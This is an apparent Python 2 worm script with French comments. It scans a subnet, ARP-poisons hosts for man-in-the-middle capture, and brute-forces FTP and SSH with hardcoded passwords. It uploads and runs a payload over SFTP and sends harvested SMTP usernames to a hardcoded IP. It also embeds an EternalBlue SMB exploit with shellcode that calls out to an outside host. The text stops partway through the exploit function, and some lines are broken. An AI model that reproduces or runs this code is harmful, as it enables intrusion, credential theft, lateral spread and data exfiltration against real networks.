# -*- coding: utf-8 -*-

#Imports pour la propag
###########################################################################
from logging import getLogger, ERROR # Import Logging Things	 	  #
getLogger("scapy.runtime").setLevel(ERROR) # Get Rid if IPv6 Warning	  #
from scapy.all import * # The One and Only Scapy                          #
import sys, os, platform 						  #
from datetime import datetime # Other stuff				  #
from time import strftime						  #
from ftplib import FTP							  #
import paramiko								  #
import socket								  #
import re 								  #
import time								  #
###########################################################################
#TODO: multithreading biatch



###########################
#  IMPORT  pour polop.py  #
###########################

import argparse
import os, sys
import shutil, zipfile
import os.path
import glob
import subprocess
import getpass
###########################

##################################
#Imports for exfiltration (https)#
##################################

import ssl
import sys
import time
import socket
import hashlib
import urllib2

from Crypto import Random
from Crypto.Cipher import AES

from itertools import izip_longest
# Setting timeout so that we won't wait forever
timeout = 2
socket.setdefaulttimeout(timeout)
###################################

##########################
#Import EternalBlue      #
##########################
from impacket import smb
from struct import pack
import os
import sys
import socket
###########################

#Vars
###########################################################################
ports = [21, 22, 25, 445 ] # ports a scanner
ip_start = "192.168.52."
ip_range = range(2, 256)
start_clock = datetime.now() # Start clock for scan time
interface = "eth0" #utilisé dans la récuparation d'adresses MAC
gateIP = "192.168.0.1"
passwords = ["test", "admin", "1234", "blabla"]
names = ['root','rminot','apinsard','msavigny']
###########################################################################

#Shellcode pour eternalblue
sc= "\xfc\xe8\x86\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x8b\x4c\x10\x78\xe3\x4a\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x89\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xdb\x53\x53\x53\x53\x53\x68\x3a\x56\x79\xa7\xff\xd5\x53\x53\x6a\x03\x53\x53\x68\x5b\x11\x00\x00\xeb\x4e\x50\x68\x57\x89\x9f\xc6\xff\xd5\x53\x68\x00\x32\xe0\x84\x53\x53\x53\xeb\x3d\x53\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x96\x6a\x10\x5f\x68\x80\x33\x00\x00\x89\xe0\x6a\x04\x50\x6a\x1f\x56\x68\x75\x46\x9e\x86\xff\xd5\x53\x53\x53\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x75\x18\x4f\x75\xd9\x68\xf0\xb5\xa2\x56\xff\xd5\xeb\x42\xe8\xbe\xff\xff\xff\x2f\x6b\x59\x52\x46\x00\x00\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x53\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xbf\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\x69\xff\xff\xff\x32\x31\x33\x2e\x33\x32\x2e\x31\x31\x32\x2e\x34\x32\x00"

def checkhost(ip):# retourne "true" si l'host est alive
	# type de ping en fonction de l'os
	ping_str = "-n 1" if  platform.system().lower()=="windows" else "-c 1"
	# Ping
	return os.system("ping " + ping_str + " " + ip) == 0

def scanport(port): # Function pour scanner un port donné
	srcPort = random.randint(1025,65534)
	resp = sr1(IP(dst=current_target)/TCP(sport=srcPort,dport=port,flags="S"),timeout=10)
	if (str(type(resp)) == "<type 'NoneType'>"):
		print current_target + ":" + str(port) + " is filtered (silently dropped)."
	elif(resp.haslayer(TCP)):
		if(resp.getlayer(TCP).flags == 0x12):
			send_rst = sr(IP(dst=current_target)/TCP(sport=srcPort,dport=port,flags="R"),timeout=10)
			print current_target + ":" + str(port) + " is open."
			return True
		elif (resp.getlayer(TCP).flags == 0x14):
			print current_target + ":" + str(port) + " is closed."
	elif(resp.haslayer(ICMP)):
		if(int(resp.getlayer(ICMP).type)==3 and int(resp.getlayer(ICMP).code) in [1,2,3,9,10,13]):
			print current_target + ":" + str(port) + " is filtered (silently dropped)"

def get_mac(IP):#recuperer l'adresse MAC d'une IP donnée
	conf.verb = 0
	ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
	for snd,rcv in ans:
		return rcv.sprintf(r"%Ether.src%")

def reARP():#remettre d'equerre les tables ARP de la victime et de la passerelle
	print "\n[*] Restoration des tables ARP en cours"
	victimMAC = get_mac(current_target)
	gateMAC = get_mac(str(gateIP))
	send(ARP(op = 2, pdst = gateIP, psrc = current_target, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
	send(ARP(op = 2, pdst = current_target, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
	print "\n[*] Done"

def trick(gm, vm): #ARP poisonning
	send(ARP(op = 2, pdst = current_target, psrc = gateIP, hwdst= vm))
	send(ARP(op = 2, pdst = gateIP, psrc = current_target, hwdst= gm))
	
def mitm(): # fonction man in the middle
	try:
		victimMAC = get_mac(current_target)
		os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
	except Exception:
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
		print "[!] Adresse MAC Victime non trouvée"

	try:
		gateMAC = get_mac(gateIP)
	except Exception:
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
		print "[!] Adresse MAC Passerelle non trouvée"
	print "[*] Poisoning..."
	
	# a faire, mitm pour un temps donné.
	while 1:
		try:
			trick(gateMAC, victimMAC)
			time.sleep(1.5)
			s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
			print s.rcvfrom(655565) >> '/exfiltration/capt_reseau.txt'
		except KeyboardInterrupt:
			reARP()
			break
	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")		

#TODO brute force -> meilleure gestion des exceptions ; multithreading
			
def bruteFTP(ip): #bruteforce FTP + récuperation de données
	storedir = "/exfiltration"
	ftp=FTP(ip)
	for password in passwords:
		try:
			ftp.login("admin", password)
			print "FTP PWND"
		except:
			print "mot de passe incorrect"
			continue
		
		print "énumération des fichiers présents sur le ftp"
		try:
			files = ftp.nlst()
			for i,v in enumerate(files,1):
				print i,"->",v
			print ""
		except:
			print "erreur du listing des fichiers FTP"
			break
			
		try:
			currdir=os.getcwd()
			for j in range(len(files)):
				os.chdir(storedir)
				print "telechargement de =>",files[j]
				fhandle = open(files[j], 'wb')
				ftp.retrbinary('RETR ' + files[j], fhandle.write)
				fhandle.close()
			os.chdir(currdir)
			ftp.quit()
			break
		except:
			print "ereur de telechargement // commande RETR non présente sur le serveur ftp ?"
			break

def bruteSsh(ip): #BruteForce SSH + envoi de binaires + execution + récupération de données
	exec_dir = ""
	source = '/exploit_locale.exe'
	destination ='/home/Admin/Desktop/exploit_locale.exe'
	remotezip='/home/Admin/Desktop/collecte.zip'
	tolocalzip='/exfiltration/collecte.zip'
	#a activer ou désactiver pour le debug
	#paramiko.util.log_to_file("paramiko.log")
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	try:
		ssh.connect(ip,port=22,username="Anonymous",password="")
		print "[*] Connexion Anonyme établie, envoi et execution du script de propagation"
		sftp = ssh.open_sftp()
		sftp.put(source,destination)
		stdin, stdout, stderr = ssh.exec_command('start exploit_locale.exe')
		time.sleep(5)
		sftp.get(remotezip,tolocalzip)
	except:
		print "[*] Authentiofication anonyme echouée, démmarage du bruteforce"
	ssh.close()

	
	for password in passwords:	
			
		try:
			ssh.connect(ip,port=22,username="Admin",password=password)
			print "[*] SSH IP: %s Password found: %s\n" % (current_target,password)
		except paramiko.AuthenticationException:
			print "[*] SSH IP: %s Password failed: %s" % (current_target,password)
			continue
			
		try:
			sftp = ssh.open_sftp()
			sftp.put(source,destination)
			stdin, stdout, stderr = ssh.exec_command('start exploit_locale.exe')
			time.sleep(5)
			sftp.get(remotezip,tolocalzip)
			break

		except KeyboardInterrupt:
			print "[*] Interruption du bruteforce"
			break
		
		except:
			print "[*] erreur lors du transfert sftp"
			break
		ssh.close()

def smtp_enum(host,port):
	print "[+] Connecting to server" 
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
	 
	try: 
		connect=s.connect((host,port)) 
	except socket.timeout: 
	  	print "\n[-] Server timed out" 
		
	except socket.error: 
	  	print "\n[-] There was an error with the server" 
		
	print "[+] Connected on" +timer() 
	print "[+] Waiting for SMTP banner" 
	banner=s.recv(1024) 
	print banner 

	for line in names: 
		s.send('VRFY '+line) 
	        result=s.recv(1024) 
		bad = re.match("502",result)  
		bad1 = re.search("send some mail",result)
		found = re.search("252",result)
		notfound = re.match("550",result)
		if bad or bad1: 
			print "[-] This server is not vulnerable!" 
			continue
		elif notfound:
			print "[-] Not found "+line
		elif found: 
	        	print "[+] Found! "+line 
			line = str(line)
			f = open("users_extract","a")
			f.write(line)
		 	f.close
			client = HTTPSExfiltrationClient(host='213.32.112.42', key="123")
			client.sendFile("users_extract")
			client.close()
		s.close()

##
## Exploit type etnernal blue
##
'''
EternalBlue exploit for Windows 7/2008 by sleepya
The exploit might FAIL and CRASH a target system (depended on what is overwritten)

Tested on:
- Windows 7 SP1 x64
- Windows 2008 R2 x64

Reference:
- http://blogs.360.cn/360safe/2017/04/17/nsa-eternalblue-smb/


Bug detail:
- For the bug detail, please see http://blogs.360.cn/360safe/2017/04/17/nsa-eternalblue-smb/
- You can see SrvOs2FeaListToNt(), SrvOs2FeaListSizeToNt() and SrvOs2FeaToNt() functions logic from WinNT4 source code
    https://github.com/Safe3/WinNT4/blob/master/private/ntos/srv/ea.c#L263
- In vulnerable SrvOs2FeaListSizeToNt() function, there is a important change from WinNT4 in for loop. The psuedo code is here.
    if (nextFea > lastFeaStartLocation) {
      // this code is for shrinking FeaList->cbList because last fea is invalid.
      // FeaList->cbList is DWORD but it is cast to WORD.
      *(WORD *)FeaList = (BYTE*)fea - (BYTE*)FeaList;
      return size;
    }
- Here is related struct info.
#####
typedef struct _FEA {   /* fea */
	BYTE fEA;        /* flags                              */
	BYTE cbName;     /* name length not including NULL */
	USHORT cbValue;  /* value length */
} FEA, *PFEA;

typedef struct _FEALIST {    /* feal */
	DWORD cbList;   /* total bytes of structure including full list */
	FEA list[1];    /* variable length FEA structures */
} FEALIST, *PFEALIST;

typedef struct _FILE_FULL_EA_INFORMATION {
  ULONG  NextEntryOffset;
  UCHAR  Flags;
  UCHAR  EaNameLength;
  USHORT EaValueLength;
  CHAR   EaName[1];
} FILE_FULL_EA_INFORMATION, *PFILE_FULL_EA_INFORMATION;
######


Exploit info:
- I do not reverse engineer any x86 binary so I do not know about exact offset.
- The exploit use heap of HAL (address 0xffffffffffd00010 on x64) for placing fake struct and shellcode.
  This memory page is executable on Windows 7 and Wndows 2008.
- The important part of feaList and fakeStruct is copied from NSA exploit which works on both x86 and x64.
- The exploit trick is same as NSA exploit
- The overflow is happened on nonpaged pool so we need to massage target nonpaged pool.
- If exploit failed but target does not crash, try increasing 'numGroomConn' value (at least 5)
- See the code and comment for exploit detail.


srvnet buffer info:
- srvnet buffer contains a pointer to another struct and MDL about received buffer
  - Controlling MDL values results in arbitrary write
  - Controlling pointer to fake struct results in code execution because there is pointer to function
- A srvnet buffer is created after target receiving first 4 bytes
  - First 4 bytes contains length of SMB message
  - The possible srvnet buffer size is "..., 0x8???, 0x11000, 0x21000, ...". srvnet.sys will select the size that big enough.
- After receiving whole SMB message or connection lost, server call SrvNetWskReceiveComplete() to handle SMB message
- SrvNetWskReceiveComplete() check and set some value then pass SMB message to SrvNetCommonReceiveHandler()
- SrvNetCommonReceiveHandler() passes SMB message to SMB handler
  - If a pointer in srvnet buffer is modified to fake struct, we can make SrvNetCommonReceiveHandler() call our shellcode
  - If SrvNetCommonReceiveHandler() call our shellcode, no SMB handler is called
  - Normally, SMB handler free the srvnet buffer when done but our shellcode dose not. So memory leak happen.
  - Memory leak is ok to be ignored
'''

# wanted overflown buffer size (this exploit support only 0x10000 and 0x11000)
# the size 0x10000 is easier to debug when setting breakpoint in SrvOs2FeaToNt() because it is called only 2 time
# the size 0x11000 is used in nsa exploit. this size is more reliable.
NTFEA_SIZE = 0x11000
# the NTFEA_SIZE above is page size. We need to use most of last page preventing any data at the end of last page

ntfea10000 = pack('<BBH', 0, 0, 0xffdd) + 'A'*0xffde

ntfea11000 = (pack('<BBH', 0, 0, 0) + '\x00')*600  # with these fea, ntfea size is 0x1c20
ntfea11000 += pack('<BBH', 0, 0, 0xf3bd) + 'A'*0xf3be  # 0x10fe8 - 0x1c20 - 0xc = 0xf3bc

ntfea1f000 = (pack('<BBH', 0, 0, 0) + '\x00')*0x2494  # with these fea, ntfea size is 0x1b6f0
ntfea1f000 += pack('<BBH', 0, 0, 0x48ed) + 'A'*0x48ee  # 0x1ffe8 - 0x1b6f0 - 0xc = 0x48ec

ntfea = { 0x10000 : ntfea10000, 0x11000 : ntfea11000 }

'''
Reverse from srvnet.sys (Win7 x64)
- SrvNetAllocateNonPagedBufferInternal() and SrvNetWskReceiveComplete():

// for x64
struct SRVNET_BUFFER {
	// offset from POOLHDR: 0x10
	USHORT flag;
	char pad[2];
	char unknown0[12];
	// offset from SRVNET_POOLHDR: 0x20
	LIST_ENTRY list;
	// offset from SRVNET_POOLHDR: 0x30
	char *pnetBuffer;
	DWORD netbufSize;  // size of netBuffer
	DWORD ioStatusInfo;  // copy value of IRP.IOStatus.Information
	// offset from SRVNET_POOLHDR: 0x40
	MDL *pMdl1; // at offset 0x70
	DWORD nByteProcessed;
	DWORD pad3;
	// offset from SRVNET_POOLHDR: 0x50
	DWORD nbssSize;  // size of this smb packet (from user)
	DWORD pad4;
	QWORD pSrvNetWekStruct;  // want to change to fake struct address
	// offset from SRVNET_POOLHDR: 0x60
	MDL *pMdl2;
	QWORD unknown5;
	// offset from SRVNET_POOLHDR: 0x70
	// MDL mdl1;  // for this srvnetBuffer (so its pointer is srvnetBuffer address)
	// MDL mdl2;
	// char transportHeader[0x50];  // 0x50 is TRANSPORT_HEADER_SIZE
	// char netBuffer[0];
};

struct SRVNET_POOLHDR {
	DWORD size;
	char unknown[12];
	SRVNET_BUFFER hdr;
};
'''
# Most field in overwritten (corrupted) srvnet struct can be any value because it will be left without free (memory leak) after processing
# Here is the important fields on x64
# - offset 0x58 (VOID*) : pointer to a struct contained pointer to function. the pointer to function is called when done receiving SMB request.
#                           The value MUST point to valid (might be fake) struct.
# - offset 0x70 (MDL)   : MDL for describe receiving SMB request buffer
#   - 0x70 (VOID*)    : MDL.Next should be NULL
#   - 0x78 (USHORT)   : MDL.Size should be some value that not too small
#   - 0x7a (USHORT)   : MDL.MdlFlags should be 0x1004 (MDL_NETWORK_HEADER|MDL_SOURCE_IS_NONPAGED_POOL)
#   - 0x80 (VOID*)    : MDL.Process should be NULL
#   - 0x88 (VOID*)    : MDL.MappedSystemVa MUST be a received network buffer address. Controlling this value get arbitrary write.
#                         The address for arbitrary write MUST be subtracted by a number of sent bytes (0x80 in this exploit).
#                         
#
# To free the corrupted srvnet buffer, shellcode MUST modify some memory value to satisfy condition.
# Here is related field for freeing corrupted buffer
# - offset 0x10 (USHORT): be 0xffff to make SrvNetFreeBuffer() really free the buffer (else buffer is pushed to srvnet lookaside)
#                           a corrupted buffer MUST not be reused.
# - offset 0x48 (DWORD) : be a number of total byte received. This field MUST be set by shellcode because SrvNetWskReceiveComplete() set it to 0
#                           before calling SrvNetCommonReceiveHandler(). This is possible because pointer to SRVNET_BUFFER struct is passed to
#                           your shellcode as function argument
# - offset 0x60 (PMDL)  : points to any fake MDL with MDL.Flags 0x20 does not set
# The last condition is your shellcode MUST return non-negative value. The easiest way to do is "xor eax,eax" before "ret".
# Here is x64 assembly code for setting nByteProcessed field
# - fetch SRVNET_BUFFER address from function argument
#     \x48\x8b\x54\x24\x40  mov rdx, [rsp+0x40]
# - set nByteProcessed for trigger free after return
#     \x8b\x4a\x2c          mov ecx, [rdx+0x2c]
#     \x89\x4a\x38          mov [rdx+0x38], ecx

TARGET_HAL_HEAP_ADDR_x64 = 0xffffffffffd00010
TARGET_HAL_HEAP_ADDR_x86 = 0xffdff000

fakeSrvNetBufferNsa = pack('<II', 0x11000, 0)*2
fakeSrvNetBufferNsa += pack('<HHI', 0xffff, 0, 0)*2
fakeSrvNetBufferNsa += '\x00'*16
fakeSrvNetBufferNsa += pack('<IIII', TARGET_HAL_HEAP_ADDR_x86+0x100, 0, 0, TARGET_HAL_HEAP_ADDR_x86+0x20)
fakeSrvNetBufferNsa += pack('<IIHHI', TARGET_HAL_HEAP_ADDR_x86+0x100, 0xffffffff, 0x60, 0x1004, 0)  # _, x86 MDL.Next, .Size, .MdlFlags, .Process
fakeSrvNetBufferNsa += pack('<IIQ', TARGET_HAL_HEAP_ADDR_x86-0x80, 0, TARGET_HAL_HEAP_ADDR_x64)  # x86 MDL.MappedSystemVa, _, x64 pointer to fake struct
fakeSrvNetBufferNsa += pack('<QQ', TARGET_HAL_HEAP_ADDR_x64+0x100, 0)  # x64 pmdl2
# below 0x20 bytes is overwritting MDL
# NSA exploit overwrite StartVa, ByteCount, ByteOffset fields but I think no need because ByteCount is always big enough
fakeSrvNetBufferNsa += pack('<QHHI', 0, 0x60, 0x1004, 0)  # MDL.Next, MDL.Size, MDL.MdlFlags
fakeSrvNetBufferNsa += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR_x64-0x80)  # MDL.Process, MDL.MappedSystemVa

# below is for targeting x64 only (all x86 related values are set to 0)
# this is for show what fields need to be modified
fakeSrvNetBufferX64 = pack('<II', 0x11000, 0)*2
fakeSrvNetBufferX64 += pack('<HHIQ', 0xffff, 0, 0, 0)
fakeSrvNetBufferX64 += '\x00'*16
fakeSrvNetBufferX64 += '\x00'*16
fakeSrvNetBufferX64 += '\x00'*16  # 0x40
fakeSrvNetBufferX64 += pack('<IIQ', 0, 0, TARGET_HAL_HEAP_ADDR_x64)  # _, _, pointer to fake struct
fakeSrvNetBufferX64 += pack('<QQ', TARGET_HAL_HEAP_ADDR_x64+0x100, 0)  # pmdl2
fakeSrvNetBufferX64 += pack('<QHHI', 0, 0x60, 0x1004, 0)  # MDL.Next, MDL.Size, MDL.MdlFlags
fakeSrvNetBufferX64 += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR_x64-0x80)  # MDL.Process, MDL.MappedSystemVa


fakeSrvNetBuffer = fakeSrvNetBufferNsa
#fakeSrvNetBuffer = fakeSrvNetBufferX64

feaList = pack('<I', 0x10000)  # the max value of feaList size is 0x10000 (the only value that can trigger bug)
feaList += ntfea[NTFEA_SIZE]
# Note:
# - SMB1 data buffer header is 16 bytes and 8 bytes on x64 and x86 respectively
#   - x64: below fea will be copy to offset 0x11000 of overflow buffer
#   - x86: below fea will be copy to offset 0x10ff8 of overflow buffer
feaList += pack('<BBH', 0, 0, len(fakeSrvNetBuffer)-1) + fakeSrvNetBuffer # -1 because first '\x00' is for name
# stop copying by invalid flag (can be any value except 0 and 0x80)
feaList += pack('<BBH', 0x12, 0x34, 0x5678)


# fake struct for SrvNetWskReceiveComplete() and SrvNetCommonReceiveHandler()
# x64: fake struct is at ffffffff ffd00010
#   offset 0xa0:  LIST_ENTRY must be valid address. cannot be NULL.
#   offset 0x08:  set to 3 (DWORD) for invoking ptr to function
#   offset 0x1d0: KSPIN_LOCK
#   offset 0x1d8: array of pointer to function
#
# code path to get code exection after this struct is controlled
# SrvNetWskReceiveComplete() -> SrvNetCommonReceiveHandler() -> call fn_ptr
fake_recv_struct = pack('<QII', 0, 3, 0)
fake_recv_struct += '\x00'*16
fake_recv_struct += pack('<QII', 0, 3, 0)
fake_recv_struct += ('\x00'*16)*7
fake_recv_struct += pack('<QQ', TARGET_HAL_HEAP_ADDR_x64+0xa0, TARGET_HAL_HEAP_ADDR_x64+0xa0)  # offset 0xa0 (LIST_ENTRY to itself)
fake_recv_struct += '\x00'*16
fake_recv_struct += pack('<IIQ', TARGET_HAL_HEAP_ADDR_x86+0xc0, TARGET_HAL_HEAP_ADDR_x86+0xc0, 0)  # x86 LIST_ENTRY
fake_recv_struct += ('\x00'*16)*11
fake_recv_struct += pack('<QII', 0, 0, TARGET_HAL_HEAP_ADDR_x86+0x190)  # fn_ptr array on x86
fake_recv_struct += pack('<IIQ', 0, TARGET_HAL_HEAP_ADDR_x86+0x1f0-1, 0)  # x86 shellcode address
fake_recv_struct += ('\x00'*16)*3
fake_recv_struct += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR_x64+0x1e0)  # offset 0x1d0: KSPINLOCK, fn_ptr array
fake_recv_struct += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR_x64+0x1f0-1)  # x64 shellcode address - 1 (this value will be increment by one)


def getNTStatus(self):
	return (self['ErrorCode'] << 16) | (self['_reserved'] << 8) | self['ErrorClass']
setattr(smb.NewSMBPacket, "getNTStatus", getNTStatus)

def sendEcho(conn, tid, data):
	pkt = smb.NewSMBPacket()
	pkt['Tid'] = tid

	transCommand = smb.SMBCommand(smb.SMB.SMB_COM_ECHO)
	transCommand['Parameters'] = smb.SMBEcho_Parameters()
	transCommand['Data'] = smb.SMBEcho_Data()

	transCommand['Parameters']['EchoCount'] = 1
	transCommand['Data']['Data'] = data
	pkt.addCommand(transCommand)

	conn.sendSMB(pkt)
	recvPkt = conn.recvSMB()
	if recvPkt.getNTStatus() == 0:
		print('got good ECHO response')
	else:
		print('got bad ECHO response: 0x{:x}'.format(recvPkt.getNTStatus()))


# do not know why Word Count can be 12
# if word count is not 12, setting ByteCount without enough data will be failed
class SMBSessionSetupAndXCustom_Parameters(smb.SMBAndXCommand_Parameters):
	structure = (
		('MaxBuffer','<H'),
		('MaxMpxCount','<H'),
		('VCNumber','<H'),
		('SessionKey','<L'),
		#('AnsiPwdLength','<H'),
		('UnicodePwdLength','<H'),
		('_reserved','<L=0'),
		('Capabilities','<L'),
	)

def createSessionAllocNonPaged(target, size):
	# The big nonpaged pool allocation is in BlockingSessionSetupAndX() function
	# You can see the allocation logic (even code is not the same) in WinNT4 source code 
	# https://github.com/Safe3/WinNT4/blob/master/private/ntos/srv/smbadmin.c#L1050 till line 1071
	conn = smb.SMB(target, target)
	_, flags2 = conn.get_flags()
	# FLAGS2_EXTENDED_SECURITY MUST not be set
	flags2 &= ~smb.SMB.FLAGS2_EXTENDED_SECURITY
	# if not use unicode, buffer size on target machine is doubled because converting ascii to utf16
	if size >= 0xffff:
		flags2 &= ~smb.SMB.FLAGS2_UNICODE
		reqSize = size // 2
	else:
		flags2 |= smb.SMB.FLAGS2_UNICODE
		reqSize = size
	conn.set_flags(flags2=flags2)
	
	pkt = smb.NewSMBPacket()

	sessionSetup = smb.SMBCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX)
	sessionSetup['Parameters'] = SMBSessionSetupAndXCustom_Parameters()

	sessionSetup['Parameters']['MaxBuffer']        = 61440  # can be any value greater than response size
	sessionSetup['Parameters']['MaxMpxCount']      = 2  # can by any value
	sessionSetup['Parameters']['VCNumber']         = os.getpid()
	sessionSetup['Parameters']['SessionKey']       = 0
	sessionSetup['Parameters']['AnsiPwdLength']    = 0
	sessionSetup['Parameters']['UnicodePwdLength'] = 0
	sessionSetup['Parameters']['Capabilities']     = 0x80000000

	# set ByteCount here
	sessionSetup['Data'] = pack('<H', reqSize) + '\x00'*20
	pkt.addCommand(sessionSetup)

	conn.sendSMB(pkt)
	recvPkt = conn.recvSMB()
	if recvPkt.getNTStatus() == 0:
		print('SMB1 session setup allocate nonpaged pool success')
	else:
		print('SMB1 session setup allocate nonpaged pool failed')
	return conn


# Note: impacket-0.9.15 struct has no ParameterDisplacement
############# SMB_COM_TRANSACTION2_SECONDARY (0x33)
class SMBTransaction2Secondary_Parameters_Fixed(smb.SMBCommand_Parameters):
    structure = (
        ('TotalParameterCount','<H=0'),
        ('TotalDataCount','<H'),
        ('ParameterCount','<H=0'),
        ('ParameterOffset','<H=0'),
        ('ParameterDisplacement','<H=0'),
        ('DataCount','<H'),
        ('DataOffset','<H'),
        ('DataDisplacement','<H=0'),
        ('FID','<H=0'),
    )

def send_trans2_second(conn, tid, data, displacement):
	pkt = smb.NewSMBPacket()
	pkt['Tid'] = tid

	# assume no params

	transCommand = smb.SMBCommand(smb.SMB.SMB_COM_TRANSACTION2_SECONDARY)
	transCommand['Parameters'] = SMBTransaction2Secondary_Parameters_Fixed()
	transCommand['Data'] = smb.SMBTransaction2Secondary_Data()

	transCommand['Parameters']['TotalParameterCount'] = 0
	transCommand['Parameters']['TotalDataCount'] = len(data)

	fixedOffset = 32+3+18
	transCommand['Data']['Pad1'] = ''

	transCommand['Parameters']['ParameterCount'] = 0
	transCommand['Parameters']['ParameterOffset'] = 0

	if len(data) > 0:
		pad2Len = (4 - fixedOffset % 4) % 4
		transCommand['Data']['Pad2'] = '\xFF' * pad2Len
	else:
		transCommand['Data']['Pad2'] = ''
		pad2Len = 0

	transCommand['Parameters']['DataCount'] = len(data)
	transCommand['Parameters']['DataOffset'] = fixedOffset + pad2Len
	transCommand['Parameters']['DataDisplacement'] = displacement

	transCommand['Data']['Trans_Parameters'] = ''
	transCommand['Data']['Trans_Data'] = data
	pkt.addCommand(transCommand)

	conn.sendSMB(pkt)


def send_nt_trans(conn, tid, setup, data, param, firstDataFragmentSize, sendLastChunk=True):
	pkt = smb.NewSMBPacket()
	pkt['Tid'] = tid

	command = pack('<H', setup)

	transCommand = smb.SMBCommand(smb.SMB.SMB_COM_NT_TRANSACT)
	transCommand['Parameters'] = smb.SMBNTTransaction_Parameters()
	transCommand['Parameters']['MaxSetupCount'] = 1
	transCommand['Parameters']['MaxParameterCount'] = len(param)
	transCommand['Parameters']['MaxDataCount'] = 0
	transCommand['Data'] = smb.SMBTransaction2_Data()

	transCommand['Parameters']['Setup'] = command
	transCommand['Parameters']['TotalParameterCount'] = len(param)
	transCommand['Parameters']['TotalDataCount'] = len(data)

	fixedOffset = 32+3+38 + len(command)
	if len(param) > 0:
		padLen = (4 - fixedOffset % 4 ) % 4
		padBytes = '\xFF' * padLen
		transCommand['Data']['Pad1'] = padBytes
	else:
		transCommand['Data']['Pad1'] = ''
		padLen = 0

	transCommand['Parameters']['ParameterCount'] = len(param)
	transCommand['Parameters']['ParameterOffset'] = fixedOffset + padLen

	if len(data) > 0:
		pad2Len = (4 - (fixedOffset + padLen + len(param)) % 4) % 4
		transCommand['Data']['Pad2'] = '\xFF' * pad2Len
	else:
		transCommand['Data']['Pad2'] = ''
		pad2Len = 0

	transCommand['Parameters']['DataCount'] = firstDataFragmentSize
	transCommand['Parameters']['DataOffset'] = transCommand['Parameters']['ParameterOffset'] + len(param) + pad2Len

	transCommand['Data']['Trans_Parameters'] = param
	transCommand['Data']['Trans_Data'] = data[:firstDataFragmentSize]
	pkt.addCommand(transCommand)

	conn.sendSMB(pkt)
	conn.recvSMB() # must be success
	
	i = firstDataFragmentSize
	while i < len(data):
		sendSize = min(4096, len(data) - i)
		if len(data) - i <= 4096:
			if not sendLastChunk:
				break
		send_trans2_second(conn, tid, data[i:i+sendSize], i)
		i += sendSize
	
	if sendLastChunk:
		conn.recvSMB()
	return i

	
# connect to target and send a large nbss size with data 0x80 bytes
# this method is for allocating big nonpaged pool (no need to be same size as overflow buffer) on target
# a nonpaged pool is allocated by srvnet.sys that started by useful struct (especially after overwritten)
def createConnectionWithBigSMBFirst80(target):
	# https://msdn.microsoft.com/en-us/library/cc246496.aspx
	# Above link is about SMB2, but the important here is first 4 bytes.
	# If using wireshark, you will see the StreamProtocolLength is NBSS length.
	# The first 4 bytes is same for all SMB version. It is used for determine the SMB message length.
	#
	# After received first 4 bytes, srvnet.sys allocate nonpaged pool for receving SMB message.
	# srvnet.sys forwards this buffer to SMB message handler after receiving all SMB message.
	# Note: For Windows 7 and Windows 2008, srvnet.sys also forwards the SMB message to its handler when connection lost too.
	sk = socket.create_connection((target, 445))
	# For this exploit, use size is 0x11000
	pkt = '\x00' + '\x00' + pack('>H', 0xfff7)
	# There is no need to be SMB2 because we got code execution by corrupted srvnet buffer.
	# Also this is invalid SMB2 message.
	# I believe NSA exploit use SMB2 for hiding alert from IDS
	#pkt += '\xffSMB' # smb2
	# it can be anything even it is invalid
	pkt += 'BAAD' # can be any
	pkt += '\x00'*0x7c
	sk.send(pkt)
	return sk


def exploit(target, shellcode, numGroomConn):
	# force using smb.SMB for SMB1
	conn = smb.SMB(target, target)

	# can use conn.login() for ntlmv2
	conn.login_standard('', '')
	server_os = conn.get_server_os()
	print('Target OS: '+server_os)
	if not (server_os.startswith("Windows 7 ") or server_os.startswith("Windows Server 2008 ")):
		print('This exploit does not support this target')
		sys.exit()
	

	tid = conn.tree_connect_andx('\\\\'+target+'\\'+'IPC$')

	# Here is code path in WinNT4 (all reference files are relative path to https://github.com/Safe3/WinNT4/blob/master/private/ntos/srv/)
	# - SrvSmbNtTransaction() (smbtrans.c#L2677)
	#   - When all data is received, call ExecuteTransaction() at (smbtrans.c#L3113)
